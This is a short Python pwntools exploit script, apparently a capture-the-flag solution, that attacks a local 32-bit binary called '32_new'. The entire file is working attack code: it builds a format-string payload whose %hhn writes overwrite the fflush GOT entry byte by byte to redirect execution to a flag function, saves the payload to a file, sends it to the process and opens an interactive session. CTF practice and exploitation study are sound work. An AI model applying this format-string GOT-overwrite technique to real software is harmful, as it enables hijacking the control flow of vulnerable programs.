from pwn import *
import struct

binary = context.binary = ELF("./32_new")

if args.GDB:
    p = gdb.debug(binary.path, gdbscript='b *main + 0xb3')
else:
    p = process(binary.path)

flush_got = 0x0804a028
# flag function at 0x0804870b

payload = b""
payload += p32(flush_got)
payload += p32(flush_got+1)
payload += p32(flush_got+2)
payload += p32(flush_got+3)

payload += b"%181x%10$hhn"
payload += b"%124x%11$hhn"
payload += b"%125x%12$hhn"
payload += b"%260x%13$hhn"

print(payload)

with open("payload", "wb") as fp:
    fp.write(payload)

p.sendline(payload)
p.interactive()